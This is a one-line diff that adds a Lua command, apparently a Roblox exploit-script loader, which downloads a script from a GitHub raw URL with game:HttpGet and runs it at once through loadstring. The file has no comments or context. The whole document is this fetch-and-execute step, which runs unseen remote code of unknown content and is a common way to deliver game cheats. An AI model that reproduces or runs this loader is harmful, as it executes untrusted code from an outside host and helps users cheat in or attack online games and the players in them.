@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/SemkoRBX/Scripts/main/Semk0/Semk0", true))()
